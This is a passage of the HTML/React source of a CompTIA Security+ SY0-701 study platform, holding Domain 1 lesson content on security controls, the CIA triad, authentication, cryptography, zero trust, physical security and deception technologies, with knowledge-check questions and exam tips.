<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security+ SY0-701 Training Platform v8</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #09090b; color: #fafafa; min-height: 100vh; }
    .slide-up { animation: slideUp 0.3s ease-out; }
    @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    .fade-in { animation: fadeIn 0.2s ease-out; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: #18181b; }
    ::-webkit-scrollbar-thumb { background: #3f3f46; border-radius: 4px; }
    ::-webkit-scrollbar-thumb:hover { background: #52525b; }
  </style>
</head>
<body>
<div id="root"></div>
<script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
<script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
<script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
<script type="text/babel">
const { useState, useEffect, useCallback, useMemo } = React;

// ═══════════════════════════════════════════════════════════════
// DESIGN TOKENS
// ═══════════════════════════════════════════════════════════════
const colors = {
  bgPrimary: '#09090b',
  bgSurface: '#18181b',
  bgElevated: '#27272a',
  textPrimary: '#fafafa',
  textSecondary: '#a1a1aa',
  textMuted: '#71717a',
  border: '#3f3f46',
  accent: '#6366f1',
  success: '#10b981',
  warning: '#f59e0b',
  error: '#ef4444',
  info: '#3b82f6',
  domain1: '#6366f1',
  domain2: '#f59e0b',
  domain3: '#10b981',
  domain4: '#8b5cf6',
  domain5: '#ec4899'
};

const getDomainColor = (domain) => colors[`domain${domain}`] || colors.accent;

const getDomainName = (domain) => {
  const names = {
    1: 'General Security Concepts',
    2: 'Threats, Vulnerabilities & Mitigations',
    3: 'Security Architecture',
    4: 'Security Operations',
    5: 'Security Program Management'
  };
  return names[domain] || `Domain ${domain}`;
};

// ═══════════════════════════════════════════════════════════════
// UTILITY FUNCTIONS
// ═══════════════════════════════════════════════════════════════
const saveProgress = (progress) => {
  try {
    localStorage.setItem('secplus_progress_v8', JSON.stringify(progress));
  } catch (e) { console.error('Save error:', e); }
};

const loadProgress = () => {
  try {
    const saved = localStorage.getItem('secplus_progress_v8');
    if (saved) return JSON.parse(saved);
  } catch (e) { console.error('Load error:', e); }
  return {
    simProgress: {},
    lessonProgress: {},
    quizProgress: {},
    practiceExams: []
  };
};

const shuffleArray = (arr) => {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
};


    // ═══════════════════════════════════════════════════════════════
    // LESSON DATA (41 lessons with full content)
    // ═══════════════════════════════════════════════════════════════
    const LESSON_DATA = [
      // ═════════════════════════════════════════════════════════════
      // DOMAIN 1: General Security Concepts
      // ═════════════════════════════════════════════════════════════
      {
        id: 'D1-LESSON-001',
        domain: 1,
        title: 'Security Controls Fundamentals',
        difficulty: 'beginner',
        duration: '45 min',
        introduction: {
          hook: "Every security breach you've ever heard of—from massive data leaks to ransomware attacks—could have been prevented or mitigated by properly implemented security controls. But here's the challenge: with thousands of potential controls available, how do you know which ones to implement? The answer lies in understanding how controls are categorized, what function each type serves, and how they work together to create layers of protection.",
          learning_goals: [
            "Categorize security controls by implementation type (technical, managerial, operational, physical)",
            "Identify control functions (preventive, detective, corrective, deterrent, compensating, directive)",
            "Apply defense-in-depth principles to create layered security architectures",
            "Select appropriate controls based on risk, cost, and operational requirements"
          ],
          why_it_matters: "As a security professional, you'll spend significant time recommending, implementing, and managing security controls. On the exam, expect 3-5 questions directly testing your ability to categorize and select appropriate controls."
        },
        sections: [
          {
            title: "Control Categories: The Four Pillars",
            content: "Security controls are categorized by HOW they are implemented.\n\n**Technical Controls (Logical Controls)**\nImplemented through technology and automated systems. Examples: Firewalls, Encryption, Antivirus/antimalware, IDS/IPS, Access Control Lists, Multi-factor authentication, DLP tools.\n\n**Managerial Controls (Administrative Controls)**\nPolicies, procedures, and guidelines established by management. Examples: Security policies, Risk assessments, Background checks, Security awareness training.\n\n**Operational Controls**\nDay-to-day procedures performed by people. Examples: Security guards, Log monitoring, Backup procedures, Incident response.\n\n**Physical Controls**\nTangible mechanisms protecting physical assets. Examples: Locks, Fences, Security cameras, Mantraps, Bollards.",
            key_points: [
              "Technical controls are implemented through technology",
              "Managerial controls are policies from management",
              "Operational controls are daily procedures by people",
              "Physical controls protect tangible assets"
            ],
            exam_tips: [
              "If a computer does it automatically, it's TECHNICAL",
              "If management wrote it as policy, it's MANAGERIAL",
              "If people do it daily as a procedure, it's OPERATIONAL",
              "If you can touch it (lock, fence, camera), it's PHYSICAL"
            ],
            knowledge_check: {
              question: "A company requires all employees to complete annual security awareness training. How should this control be categorized?",
              options: [
                "Technical control because it uses a computer-based training platform",
                "Managerial control because it's a policy requirement from management",
                "Operational control because employees must actively participate",
                "Physical control because employees attend in-person sessions"
              ],
              correct: 1,
              explanation: "Security awareness training is a MANAGERIAL control because it's a policy requirement established by management. The delivery method doesn't change the category."
            }
          },
          {
            title: "Control Types: Function and Purpose",
            content: "Control types tell us WHAT the control is designed to accomplish.\n\n**Preventive Controls**\nStop security incidents before they occur. Examples: Firewalls, Encryption, Access controls, Input validation.\n\n**Detective Controls**\nIdentify security incidents during or after they occur. Examples: IDS, Log monitoring, Security cameras, Audit trails.\n\n**Corrective Controls**\nFix issues after they're identified. Examples: Backup restoration, Patch management, Incident response.\n\n**Deterrent Controls**\nDiscourage security violations. Examples: Warning banners, Security cameras (visible), Policies with penalties.\n\n**Compensating Controls**\nAlternative controls when primary controls aren't feasible. Example: Extra monitoring when you can't implement encryption on legacy system.\n\n**Directive Controls**\nDirect behavior toward security compliance. Examples: Acceptable use policies, Security procedures.",
            key_points: [
              "Preventive = stops incidents before they happen",
              "Detective = identifies incidents as/after they occur",
              "Corrective = fixes issues after detection",
              "Deterrent = discourages violations",
              "Compensating = alternative when primary isn't feasible"
            ],
            knowledge_check: {
              question: "An organization places prominent 'Premises Under Video Surveillance' signs throughout their facility, but the cameras aren't actually functional. What type of control is this?",
              options: [
                "Detective—it helps detect intruders",
                "Preventive—it stops unauthorized access",
                "Deterrent—it discourages potential violators",
                "Compensating—it makes up for lack of real cameras"
              ],
              correct: 2,
              explanation: "This is a DETERRENT control. Its purpose is to discourage potential violators by making them believe they're being watched. Since the cameras don't work, it's not detective (can't detect) or preventive (can't prevent)."
            }
          },
          {
            title: "Defense in Depth",
            content: "Defense in depth uses multiple overlapping security controls to protect assets. If one control fails, others provide backup protection.\n\n**Layered Security Model:**\n- Data: Encryption, access controls, DLP\n- Application: Input validation, WAF, secure coding\n- Host: Antivirus, EDR, host firewall, hardening\n- Network: Firewalls, IDS/IPS, segmentation\n- Perimeter: DMZ, border routers, firewalls\n- Physical: Locks, guards, cameras\n- Policies: Security policies, training, procedures\n\n**Why Defense in Depth Works:**\n- No single point of failure\n- Attackers must bypass multiple controls\n- Provides time for detection and response\n- Different controls catch different attack types",
            key_points: [
              "Multiple overlapping controls provide redundancy",
              "If one layer fails, others still protect",
              "Combines technical, physical, and administrative controls",
              "Each layer addresses different threats"
            ],
            knowledge_check: {
              question: "An organization's firewall was bypassed by an attacker using an encrypted channel. However, the EDR tool on the target workstation detected and blocked the malicious payload. This demonstrates which security principle?",
              options: [
                "Least privilege—the attacker didn't have sufficient permissions",
                "Defense in depth—multiple layers provided protection when one failed",
                "Separation of duties—different teams managed different controls",
                "Zero trust—the internal system didn't trust external traffic"
              ],
              correct: 1,
              explanation: "This is defense in depth. The perimeter control (firewall) was bypassed, but the host-layer control (EDR) provided the next line of defense."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Four control categories: Technical, Managerial, Operational, Physical",
            "Six control types: Preventive, Detective, Corrective, Deterrent, Compensating, Directive",
            "Defense in depth uses multiple overlapping layers",
            "Compensating controls provide alternatives when primary controls aren't feasible"
          ],
          exam_essentials: [
            "Technical = technology implements it",
            "Managerial = management policy",
            "Operational = people perform daily",
            "Physical = tangible protection",
            "Compensating = alternative when primary not feasible"
          ]
        }
      },
      {
        id: 'D1-LESSON-002',
        domain: 1,
        title: 'CIA Triad Fundamentals',
        difficulty: 'beginner',
        duration: '45 min',
        introduction: {
          hook: "Every security decision you'll ever make—whether choosing a firewall, designing an authentication system, or responding to an incident—ultimately comes down to protecting three things: Confidentiality, Integrity, and Availability. These three pillars form the foundation of information security.",
          learning_goals: [
            "Apply the CIA Triad to analyze security scenarios",
            "Distinguish between confidentiality, integrity, and availability controls",
            "Explain non-repudiation and its role in security",
            "Implement the AAA framework (Authentication, Authorization, Accounting)"
          ],
          why_it_matters: "The CIA Triad is the lens through which security professionals view every problem. When a SOC analyst triages an alert, they're assessing CIA impact."
        },
        sections: [
          {
            title: "Confidentiality: Keeping Secrets Secret",
            content: "Confidentiality ensures information is accessible only to authorized individuals.\n\n**Threats to Confidentiality:**\n- Network eavesdropping\n- Man-in-the-middle attacks\n- SQL injection exposing databases\n- Social engineering\n- Insider threats\n\n**Controls for Confidentiality:**\n- Encryption (primary control)\n- Access controls\n- Data classification\n- Need-to-know policies\n- DLP tools",
            key_points: [
              "Confidentiality prevents unauthorized disclosure",
              "Encryption is the primary technical control",
              "Data classification determines protection level",
              "Need-to-know limits access to necessary information"
            ],
            knowledge_check: {
              question: "An attacker intercepted and read emails between executives discussing a planned acquisition. Which CIA element was PRIMARILY compromised?",
              options: [
                "Integrity, because the attacker may have modified emails",
                "Availability, because emails were delayed",
                "Confidentiality, because unauthorized access occurred",
                "Non-repudiation, because executives can't prove they sent emails"
              ],
              correct: 2,
              explanation: "Confidentiality was compromised—unauthorized access to email content occurred. The attacker READ the emails (unauthorized disclosure)."
            }
          },
          {
            title: "Integrity: Ensuring Trustworthy Data",
            content: "Integrity ensures data remains accurate, complete, and unaltered except by authorized processes.\n\n**Threats to Integrity:**\n- Attackers altering data\n- Malware modifying system files\n- SQL injection changing records\n- Man-in-the-middle altering communications\n\n**Controls for Integrity:**\n- Hashing (MD5, SHA-256, SHA-3)\n- Digital signatures\n- Message Authentication Codes (MAC)\n- Input validation\n- Version control",
            key_points: [
              "Integrity ensures data hasn't been tampered with",
              "Hashing creates fingerprints to detect changes",
              "Digital signatures prove both integrity AND origin",
              "Input validation prevents corruption at the source"
            ],
            knowledge_check: {
              question: "A hospital needs to ensure that patient medication orders haven't been modified after the doctor submits them. Which control BEST addresses this requirement?",
              options: [
                "Encryption of the orders database",
                "Digital signatures on submitted orders",
                "Access controls limiting who can view orders",
                "Regular backups of the orders database"
              ],
              correct: 1,
              explanation: "Digital signatures prove both integrity (wasn't modified) AND authentication (came from the claimed doctor). Encryption protects confidentiality, not integrity."
            }
          },
          {
            title: "Availability: Systems When You Need Them",
            content: "Availability ensures systems and data are accessible when needed by authorized users.\n\n**Threats to Availability:**\n- DDoS attacks\n- Hardware failures\n- Natural disasters\n- Ransomware\n- Power outages\n\n**Controls for Availability:**\n- Redundancy (RAID, clustering)\n- Backups and disaster recovery\n- Load balancing\n- UPS and generators\n- Failover systems\n\n**Key Metrics:**\n- RTO (Recovery Time Objective): Maximum acceptable downtime\n- RPO (Recovery Point Objective): Maximum acceptable data loss",
            key_points: [
              "Availability ensures access when needed",
              "Redundancy eliminates single points of failure",
              "RTO = maximum downtime; RPO = maximum data loss",
              "Backups protect against data loss but need recovery time"
            ],
            knowledge_check: {
              question: "A company's website goes offline during a DDoS attack, preventing customers from placing orders. Which CIA element is PRIMARILY affected?",
              options: [
                "Confidentiality—customer data might be exposed",
                "Integrity—orders might be corrupted",
                "Availability—the service is inaccessible",
                "Non-repudiation—customers can't prove they tried to order"
              ],
              correct: 2,
              explanation: "Availability is affected—the service is inaccessible to legitimate users. DDoS attacks primarily target availability."
            }
          },
          {
            title: "AAA Framework",
            content: "AAA provides systematic access control:\n\n**Authentication**: Who are you?\n- Something you know (password)\n- Something you have (token)\n- Something you are (biometric)\n- Somewhere you are (location)\n- Something you do (behavior)\n\n**Authorization**: What can you do?\n- Permissions and access rights\n- Based on roles, attributes, or rules\n- Implements least privilege\n\n**Accounting**: What did you do?\n- Logging and audit trails\n- Tracks user activity\n- Supports forensics and compliance",
            key_points: [
              "Authentication verifies identity (who)",
              "Authorization determines permissions (what)",
              "Accounting tracks activity (audit)",
              "MFA requires factors from DIFFERENT categories"
            ],
            exam_tips: [
              "Two passwords is NOT MFA (same category)",
              "AAA order: Authentication → Authorization → Accounting",
              "RADIUS = UDP, encrypts password only",
              "TACACS+ = TCP, encrypts entire packet"
            ],
            knowledge_check: {
              question: "A user logs in with password and fingerprint, then the system checks group membership for permissions, and logs file access. Which sequence describes this?",
              options: [
                "Accounting → Authentication → Authorization",
                "Authorization → Authentication → Accounting",
                "Authentication → Authorization → Accounting",
                "Authentication → Accounting → Authorization"
              ],
              correct: 2,
              explanation: "AAA sequence: Authentication (verify identity with password + fingerprint), Authorization (determine permissions), Accounting (log access)."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "CIA Triad: Confidentiality, Integrity, Availability",
            "Confidentiality = prevent unauthorized disclosure; Encryption is key control",
            "Integrity = ensure data unchanged; Hashing and digital signatures",
            "Availability = accessible when needed; Redundancy and backups",
            "AAA: Authentication (who) → Authorization (what permissions) → Accounting (audit)"
          ],
          exam_essentials: [
            "Encryption = Confidentiality; Hashing = Integrity",
            "RTO = maximum downtime; RPO = maximum data loss",
            "Digital signatures provide integrity + authentication + non-repudiation",
            "MFA requires factors from DIFFERENT categories",
            "RADIUS = UDP; TACACS+ = TCP, more secure"
          ]
        }
      },
      {
        id: 'D1-LESSON-003',
        domain: 1,
        title: 'Authentication Methods',
        difficulty: 'beginner',
        duration: '50 min',
        introduction: {
          hook: "The Colonial Pipeline ransomware attack that disrupted fuel supplies across the Eastern United States in 2021 started with a single compromised password on a VPN account that didn't use multi-factor authentication. One weak authentication control led to $4.4 million in ransom payments.",
          learning_goals: [
            "Identify the five authentication factors (knowledge, possession, inherence, location, behavior)",
            "Design multi-factor authentication using factors from different categories",
            "Compare authentication technologies including biometrics, tokens, and certificates",
            "Recognize common authentication attacks and countermeasures"
          ]
        },
        sections: [
          {
            title: "The Five Authentication Factors",
            content: "**Something You Know (Knowledge)**\n- Passwords, PINs, security questions\n- Most common but weakest factor\n- Vulnerable to guessing, phishing, shoulder surfing\n\n**Something You Have (Possession)**\n- Smart cards, security tokens, phones\n- Hardware tokens (RSA SecurID)\n- Software tokens (authenticator apps)\n- SMS codes (weakest possession factor)\n\n**Something You Are (Inherence)**\n- Biometrics: fingerprint, facial, iris, voice\n- Can't be changed if compromised\n- FAR (False Acceptance Rate) = security concern\n- FRR (False Rejection Rate) = usability concern\n\n**Somewhere You Are (Location)**\n- GPS, IP geolocation, network location\n- Geofencing restricts access by location\n\n**Something You Do (Behavior)**\n- Typing patterns, mouse movements, gait\n- Continuous authentication possible",
            key_points: [
              "Five factors: Know, Have, Are, Where, Do",
              "MFA requires factors from DIFFERENT categories",
              "Two passwords is NOT MFA (same category)",
              "Biometrics can't be changed if compromised"
            ],
            knowledge_check: {
              question: "A user authenticates with a password and then answers a security question. Is this multi-factor authentication?",
              options: [
                "Yes, because two different pieces of information are used",
                "No, because both are 'something you know' factors",
                "Yes, because security questions verify identity",
                "No, because passwords are not secure enough"
              ],
              correct: 1,
              explanation: "Both password and security question are 'something you know' factors. MFA requires factors from DIFFERENT categories."
            }
          },
          {
            title: "Authentication Technologies",
            content: "**TOTP (Time-based One-Time Password)**\n- Changes every 30 seconds\n- Shared secret + current time\n- Google Authenticator, Microsoft Authenticator\n\n**HOTP (HMAC-based One-Time Password)**\n- Counter-based, not time-based\n- Increments with each use\n\n**FIDO2/WebAuthn**\n- Phishing-resistant (bound to specific domain)\n- Public key cryptography\n- Hardware security keys (YubiKey)\n- Strongest authentication method\n\n**Biometric Considerations**\n- FAR (False Acceptance Rate): Unauthorized user accepted (security risk)\n- FRR (False Rejection Rate): Authorized user rejected (usability issue)\n- CER/EER (Crossover Error Rate): Where FAR = FRR (lower is better)",
            key_points: [
              "TOTP = time-based; HOTP = counter-based",
              "FIDO2/WebAuthn is phishing-resistant",
              "FAR = security concern; FRR = usability concern",
              "CER/EER compares biometric systems (lower = better)"
            ],
            exam_tips: [
              "SMS MFA is vulnerable to SIM swapping",
              "FIDO2 keys are domain-bound (phishing resistant)",
              "FAR = Type II error; FRR = Type I error"
            ],
            knowledge_check: {
              question: "Which authentication method provides the BEST protection against phishing attacks?",
              options: [
                "SMS-based one-time codes",
                "TOTP authenticator app",
                "FIDO2 hardware security key",
                "Email-based verification links"
              ],
              correct: 2,
              explanation: "FIDO2 keys are domain-bound—they only authenticate to the legitimate site. Even if a user visits a phishing site, the key won't work because the domain doesn't match."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Five factors: Knowledge, Possession, Inherence, Location, Behavior",
            "MFA requires factors from DIFFERENT categories",
            "SMS MFA is weakest; FIDO2 is strongest (phishing-resistant)",
            "Biometric FAR = security; FRR = usability"
          ],
          exam_essentials: [
            "Two passwords ≠ MFA (same category)",
            "FIDO2/WebAuthn = phishing resistant",
            "FAR = Type II (accept unauthorized); FRR = Type I (reject authorized)",
            "TOTP = time-based; HOTP = counter-based"
          ]
        }
      },
      {
        id: 'D1-LESSON-004',
        domain: 1,
        title: 'Cryptographic Fundamentals',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "When you send a message through WhatsApp, enter your credit card online, or connect to your company's VPN, cryptography is working behind the scenes. In 2017, researchers discovered a flaw in RSA key generation that affected millions of devices. Understanding cryptographic principles is essential for recognizing when systems are secure.",
          learning_goals: [
            "Distinguish between symmetric and asymmetric encryption",
            "Explain how hash functions provide integrity verification",
            "Describe how digital signatures provide authentication and non-repudiation",
            "Understand PKI components and certificate management"
          ]
        },
        sections: [
          {
            title: "Symmetric Encryption",
            content: "Symmetric encryption uses the SAME key for encryption and decryption.\n\n**How It Works:**\n1. Sender and receiver share secret key\n2. Sender encrypts: Plaintext + Key → Ciphertext\n3. Receiver decrypts: Ciphertext + Key → Plaintext\n\n**Common Algorithms:**\n- AES (Advanced Encryption Standard): Current standard, 128/192/256-bit\n- DES: Deprecated, 56-bit (too weak)\n- 3DES: Deprecated, being phased out\n- RC4: Broken, never use\n\n**Advantages:** Fast, efficient for large data\n**Disadvantage:** Key distribution problem (how to share key securely?)",
            key_points: [
              "Same key encrypts and decrypts",
              "AES is the current standard",
              "Fast for bulk data encryption",
              "Key distribution is the challenge"
            ],
            knowledge_check: {
              question: "Which symmetric encryption algorithm should be used for protecting sensitive data?",
              options: [
                "DES with 56-bit keys",
                "AES with 256-bit keys",
                "RC4 stream cipher",
                "3DES with triple encryption"
              ],
              correct: 1,
              explanation: "AES-256 is the current standard. DES and 3DES are deprecated. RC4 is broken and should never be used."
            }
          },
          {
            title: "Asymmetric Encryption",
            content: "Asymmetric encryption uses a KEY PAIR: public key and private key.\n\n**Key Principles:**\n- Public key: shared freely, used to encrypt\n- Private key: kept secret, used to decrypt\n- Encrypt with PUBLIC → Decrypt with PRIVATE\n- Sign with PRIVATE → Verify with PUBLIC\n\n**Common Algorithms:**\n- RSA: Most common, 2048+ bit keys\n- ECC: Smaller keys, same security (256 ECC ≈ 3072 RSA)\n- Diffie-Hellman: Key exchange only\n\n**Hybrid Encryption:**\nCombines both: Use asymmetric to exchange symmetric key, then symmetric for data (TLS does this)",
            key_points: [
              "Public key encrypts; Private key decrypts",
              "Private key signs; Public key verifies",
              "RSA and ECC are common algorithms",
              "Hybrid combines both approaches (TLS)"
            ],
            exam_tips: [
              "Encrypt with PUBLIC, decrypt with PRIVATE",
              "Sign with PRIVATE, verify with PUBLIC",
              "ECC: smaller keys, same security as larger RSA"
            ],
            knowledge_check: {
              question: "To send an encrypted message to Alice, which key do you use?",
              options: [
                "Your private key",
                "Your public key",
                "Alice's private key",
                "Alice's public key"
              ],
              correct: 3,
              explanation: "Encrypt with the RECIPIENT's PUBLIC key. Only Alice's private key can decrypt it, ensuring only she can read the message."
            }
          },
          {
            title: "Hashing and Digital Signatures",
            content: "**Hash Functions:**\n- One-way function: can't reverse to get original\n- Fixed output size regardless of input size\n- Any change produces completely different hash\n\n**Current Standards:**\n- SHA-256, SHA-3: Current standards\n- SHA-1: Deprecated (collisions found)\n- MD5: Broken (never use for security)\n\n**Digital Signatures:**\n1. Hash the message\n2. Encrypt hash with sender's PRIVATE key\n3. Recipient decrypts with sender's PUBLIC key\n4. Recipient hashes message and compares\n\nProvides: Integrity + Authentication + Non-repudiation",
            key_points: [
              "Hashing is one-way (can't reverse)",
              "SHA-256/SHA-3 are current standards",
              "MD5 and SHA-1 are broken/deprecated",
              "Digital signatures = hash encrypted with private key"
            ],
            knowledge_check: {
              question: "What three properties does a digital signature provide?",
              options: [
                "Confidentiality, Integrity, Availability",
                "Authentication, Integrity, Non-repudiation",
                "Encryption, Hashing, Signing",
                "Privacy, Anonymity, Security"
              ],
              correct: 1,
              explanation: "Digital signatures provide Authentication (proves sender), Integrity (proves not modified), and Non-repudiation (sender can't deny signing). NOT confidentiality—the message isn't encrypted."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Symmetric: same key, fast, key distribution problem (AES)",
            "Asymmetric: key pair, solves distribution, slower (RSA, ECC)",
            "Hashing: one-way, integrity verification (SHA-256)",
            "Digital signatures: integrity + authentication + non-repudiation"
          ],
          exam_essentials: [
            "AES = symmetric standard; DES/3DES/RC4 = deprecated",
            "Encrypt with PUBLIC, decrypt with PRIVATE",
            "Sign with PRIVATE, verify with PUBLIC",
            "MD5/SHA-1 = deprecated; SHA-256/SHA-3 = current"
          ]
        }
      },
      {
        id: 'D1-LESSON-005',
        domain: 1,
        title: 'Zero Trust Architecture',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "Traditional security assumed everything inside the network perimeter was trusted. Zero Trust flips this: 'Never trust, always verify.' Every access request is authenticated, authorized, and encrypted regardless of where it originates.",
          learning_goals: [
            "Understand Zero Trust principles and architecture",
            "Implement identity-centric security controls",
            "Apply microsegmentation concepts",
            "Design continuous verification mechanisms"
          ]
        },
        sections: [
          {
            title: "Zero Trust Principles",
            content: "**Core Tenets:**\n- Never trust, always verify\n- Assume breach\n- Verify explicitly\n- Least privilege access\n- Microsegmentation\n\n**Control Plane vs Data Plane:**\n- Control Plane: Makes access decisions (policy engine)\n- Data Plane: Enforces decisions (policy enforcement points)\n\n**Key Components:**\n- Policy Engine: Decides who gets access\n- Policy Administrator: Configures policies\n- Policy Enforcement Point: Enforces decisions",
            key_points: [
              "Never trust, always verify (even internal)",
              "Assume breach—build detection and response",
              "Identity is the new perimeter",
              "Microsegmentation limits lateral movement"
            ],
            knowledge_check: {
              question: "Which statement BEST describes the Zero Trust security model?",
              options: [
                "Trust internal users but verify external users",
                "Never trust any user or device, always verify",
                "Trust users after initial authentication",
                "Verify only when accessing sensitive resources"
              ],
              correct: 1,
              explanation: "Zero Trust means never trust, always verify—regardless of network location. Even internal users and devices must be continuously verified."
            }
          },
          {
            title: "Implementing Zero Trust",
            content: "**Identity Foundation:**\n- Strong authentication (MFA required)\n- Phishing-resistant MFA preferred (FIDO2)\n- Just-in-time access (temporary privileges)\n- Just-enough access (minimum necessary)\n\n**Device Trust:**\n- Device health verification\n- Managed vs unmanaged device policies\n- Endpoint detection and response (EDR)\n\n**Network Controls:**\n- Microsegmentation (network boundaries around workloads)\n- Software-defined perimeter\n- Encrypted communications everywhere\n\n**Continuous Verification:**\n- Behavioral analytics\n- Risk-based authentication\n- Session monitoring",
            key_points: [
              "MFA is foundational to Zero Trust",
              "Device health affects access decisions",
              "Microsegmentation limits blast radius",
              "Continuous monitoring, not one-time auth"
            ],
            exam_tips: [
              "Zero Trust = identity-centric, not network-centric",
              "Microsegmentation creates boundaries around workloads",
              "Control plane decides; Data plane enforces"
            ],
            knowledge_check: {
              question: "What is the PRIMARY benefit of microsegmentation in a Zero Trust architecture?",
              options: [
                "Faster network performance",
                "Simplified network management",
                "Limiting lateral movement after breach",
                "Reducing the need for firewalls"
              ],
              correct: 2,
              explanation: "Microsegmentation creates security boundaries around individual workloads, limiting an attacker's ability to move laterally if they compromise one system."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Never trust, always verify—regardless of location",
            "Identity is the new perimeter",
            "Assume breach and build detection/response",
            "Microsegmentation limits lateral movement"
          ],
          exam_essentials: [
            "Zero Trust: never trust, always verify",
            "Control plane = decisions; Data plane = enforcement",
            "Microsegmentation = boundaries around workloads",
            "FIDO2 = phishing-resistant MFA"
          ]
        }
      },
      {
        id: 'D1-LESSON-006',
        domain: 1,
        title: 'Physical Security Controls',
        difficulty: 'beginner',
        duration: '45 min',
        introduction: {
          hook: "In 2019, a contractor walked into a data center, plugged in a USB device, and walked out with gigabytes of customer data. No visitor logs, no badge monitoring, no USB port controls. Physical security is the foundation upon which all other security controls depend.",
          learning_goals: [
            "Design layered physical security using defense-in-depth",
            "Select appropriate access control mechanisms for facility zones",
            "Implement environmental controls for equipment protection",
            "Integrate physical and logical security controls"
          ]
        },
        sections: [
          {
            title: "Physical Access Controls",
            content: "**Perimeter Security:**\n- Fencing (8+ feet for high security)\n- Bollards (vehicle barriers)\n- Lighting (eliminate shadows)\n- Gates and guard posts\n\n**Building Entry:**\n- Badge/card readers\n- Biometric scanners\n- Mantraps/airlocks (prevent tailgating)\n- Turnstiles\n- Security guards\n\n**Interior Controls:**\n- Locked doors and cabinets\n- Server room access controls\n- Cable locks for equipment\n- Visitor escorts",
            key_points: [
              "Layered approach: perimeter → building → room → rack",
              "Mantraps prevent tailgating (one door closes before next opens)",
              "Badge systems provide audit trails",
              "Visitor management is critical"
            ],
            knowledge_check: {
              question: "Which control BEST prevents tailgating into a secure facility?",
              options: [
                "Security cameras",
                "Badge readers",
                "Mantrap/airlock",
                "Security guards"
              ],
              correct: 2,
              explanation: "Mantraps (airlocks) prevent tailgating because one door must close before the next opens, ensuring only one authorized person enters at a time."
            }
          },
          {
            title: "Environmental Controls",
            content: "**HVAC (Heating, Ventilation, Air Conditioning):**\n- Data centers: 64-75°F recommended\n- Humidity: 40-60% (prevent static/condensation)\n- Hot aisle/cold aisle containment\n\n**Fire Suppression:**\n- FM-200/Clean agent: Safe for electronics, won't damage equipment\n- Water (wet pipe, dry pipe, pre-action): Can damage equipment\n- CO2: Dangerous to humans, data centers only when evacuated\n\n**Power Protection:**\n- UPS (Uninterruptible Power Supply): Short-term battery backup\n- Generator: Long-term backup power\n- PDU (Power Distribution Unit): Distributes power to racks",
            key_points: [
              "FM-200 is safe for electronics (clean agent)",
              "Water systems can damage equipment",
              "UPS for short-term; generators for long-term",
              "HVAC critical for equipment longevity"
            ],
            exam_tips: [
              "FM-200 = clean agent, safe for electronics",
              "Wet pipe = always has water (fastest response)",
              "Dry pipe = water held back (for cold environments)",
              "Pre-action = requires two triggers"
            ],
            knowledge_check: {
              question: "Which fire suppression system is BEST for a data center with running equipment?",
              options: [
                "Wet pipe sprinkler system",
                "FM-200 clean agent system",
                "CO2 flooding system",
                "Dry chemical extinguishers"
              ],
              correct: 1,
              explanation: "FM-200 (clean agent) is safe for electronics and humans, won't damage equipment, and leaves no residue. Water damages equipment; CO2 is dangerous to humans."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Physical security is foundational—if attackers can touch systems, they can own them",
            "Layered defense: perimeter → building → room → rack",
            "Mantraps prevent tailgating",
            "FM-200 is the preferred fire suppression for data centers"
          ],
          exam_essentials: [
            "Mantrap = prevents tailgating",
            "FM-200 = clean agent, safe for electronics",
            "Bollards = vehicle barriers",
            "Hot/cold aisle = data center cooling efficiency"
          ]
        }
      },
      {
        id: 'D1-LESSON-007',
        domain: 1,
        title: 'Deception Technologies',
        difficulty: 'intermediate',
        duration: '40 min',
        introduction: {
          hook: "What if instead of just defending against attackers, you could trick them into revealing themselves while they waste time attacking fake systems? Deception technologies present convincing fakes that have no legitimate business use—meaning any interaction is immediately suspicious.",
          learning_goals: [
            "Differentiate between honeypots, honeynets, honeytokens, and honeyfiles",
            "Design deception strategies for different security objectives",
            "Understand how fake telemetry and DNS sinkholes disrupt attackers"
          ]
        },
        sections: [
          {
            title: "Deception Technology Types",
            content: "**Honeypots:**\n- Decoy systems that attract attackers\n- Low interaction: Emulate services, limited engagement\n- High interaction: Full OS, deeper engagement, more risk\n\n**Honeynets:**\n- Network of honeypots simulating entire environment\n- More realistic to attackers\n- Greater intelligence gathering\n\n**Honeytokens:**\n- Fake data that triggers alerts when accessed\n- Fake credentials, API keys, database records\n- No legitimate use = any access is suspicious\n\n**Honeyfiles:**\n- Decoy files that alert when opened\n- 'passwords.xlsx', 'confidential_merger.docx'\n- Detect insider threats and data exfiltration",
            key_points: [
              "Honeypots = decoy systems",
              "Honeynets = network of honeypots",
              "Honeytokens = fake data (credentials, records)",
              "Honeyfiles = decoy documents"
            ],
            knowledge_check: {
              question: "A security team plants fake AWS credentials in a code repository. When used, alerts trigger. What is this called?",
              options: [
                "Honeypot",
                "Honeynet",
                "Honeytoken",
                "Honeyfile"
              ],
              correct: 2,
              explanation: "Honeytokens are fake data items (like credentials) that have no legitimate use. Any attempt to use them indicates compromise or malicious activity."
            }
          },
          {
            title: "DNS Sinkholes and Fake Telemetry",
